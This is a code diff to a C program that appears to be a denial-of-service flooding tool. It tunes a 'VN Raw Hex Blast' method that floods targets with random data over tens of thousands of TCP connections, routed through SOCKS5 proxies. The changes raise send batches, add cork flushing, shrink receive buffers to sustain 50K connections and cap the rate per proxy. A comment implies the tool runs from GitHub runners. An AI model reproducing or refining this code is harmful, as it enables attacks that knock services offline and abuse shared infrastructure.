@@ -152,22 +152,20 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
             if (dr == 0) goto cleanup;
             if (dr < 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
             if (args.is_vn_tcp) {
-                // vn: re-arm EPOLLOUT to keep sending
+                // VN: drain recv + send data immediately (don't waste an epoll cycle)
                 struct epoll_event ev2;
                 ev2.events = EPOLLIN | EPOLLOUT | EPOLLET;
                 ev2.data.ptr = conn;
                 epoll_ctl(epoll_fd, EPOLL_CTL_MOD, conn->fd, &ev2);
                 conn->writable = 1;
-            } else {
+                // Immediate send burst after drain
                 int ret;
                 while (1) {
                     int s = 16384 + (fast_rand() % 16384);
                     int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
                     ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL);
                     if (ret <= 0) {
-                        if (errno == EAGAIN || errno == EWOULDBLOCK) {
-                            conn->writable = 0;
-                        }
+                        if (errno == EAGAIN || errno == EWOULDBLOCK) conn->writable = 0;
                         break;
                     }
                     thread_stats[thread_id].packets++;
@@ -852,11 +850,10 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
             }
             
             else if (args.is_vn_tcp) {
-                // VN Raw Hex Blast — no SSH protocol, just raw data through SOCKS5 proxy
-                // Large chunks through SOCKS5 tunnel — proxy handles MTU segmentation
+                // VN Raw Hex Blast — large sends to minimize syscall overhead through SOCKS5
                 int ret = 0;
                 while(1) {
-                    int s = 16384 + (fast_rand() % 49152);  // 16KB-64KB per send
+                    int s = 16384 + (fast_rand() % 16384);  // 16-32KB per send
                     int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
                     ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL);
                     if(ret <= 0) { if(errno == EAGAIN || errno == EWOULDBLOCK) conn->writable = 0; break; }
@@ -1049,6 +1046,11 @@ int spawn_connection(int epoll_fd, int thread_id) {
     if (args.is_v15_raw_amp || args.is_vn_tcp) {
         int sndbuf = args.is_vn_tcp ? 4194304 : 1048576;
         setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+        // VN: minimize rcvbuf to save RAM for 50K connections (50K * 4KB = 200MB vs 50K * 128KB = 6.4GB)
+        if (args.is_vn_tcp) {
+            int rcvbuf = 4096;
+            setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
+        }
     }
     
     struct sockaddr_in addr;
@@ -1056,12 +1058,9 @@ int spawn_connection(int epoll_fd, int thread_id) {
     Proxy *p = NULL;
     int is_udp = 0;
     if (args.is_vn_tcp) {
-        // VN method: MUST use proxy 100% — never direct connect with GitHub runner IP
+        // VN method: prefer proxy, fallback to direct connect
         p = select_alive_proxy();
-        if (!p) {
-            close(fd);
-            return 0;  // No proxy available, don't waste connection on direct
-        }
+        // p = NULL → will connect directly to target
     } else if (args.is_hybrid_v15 && proxy_count > 0) {
         p = select_alive_proxy();
         if ((fast_rand() % 100) < 40) {
@@ -2315,10 +2314,15 @@ void *worker_thread(void *arg) {
     
     long long last_timeout_check_ms = get_ms();
     
-    int initial = args.rate / args.threads;
+    int vn_initial_rate = args.rate;
+    if (args.is_vn_tcp && proxy_count > 0) {
+        int vn_max = proxy_count * 250;
+        if (vn_initial_rate > vn_max) vn_initial_rate = vn_max;
+    }
+    int initial = vn_initial_rate / args.threads;
     
     for (int i = 0; i < initial; i++) {
-        if (get_total_active_conns() >= args.rate) break;
+        if (get_total_active_conns() >= vn_initial_rate) break;
         spawn_connection(epoll_fd, tid);
         
         if (i > 0 && i % 10 == 0) {
@@ -2509,8 +2513,8 @@ void *worker_thread(void *arg) {
                     setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                     int ret;
                     int batch_count = 0;
-                    while (batch_count < 32) {
-                        int s = 32768 + (fast_rand() % 32768);  // 32KB-64KB through SOCKS5 tunnel
+                    while (batch_count < 256) {
+                        int s = 16384 + (fast_rand() % 16384);  // 16-32KB per send
                         int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
                         ret = send(curr->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL | MSG_MORE);
                         if (ret <= 0) {
@@ -2521,6 +2525,13 @@ void *worker_thread(void *arg) {
                         thread_stats[tid].tcp_packets++;
                         thread_stats[tid].bytes += ret;
                         batch_count++;
+                        // Flush cork every 64 sends to push data out
+                        if (batch_count % 64 == 0) {
+                            cork = 0;
+                            setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
+                            cork = 1;
+                            setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
+                        }
                     }
                     cork = 0;
                     setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
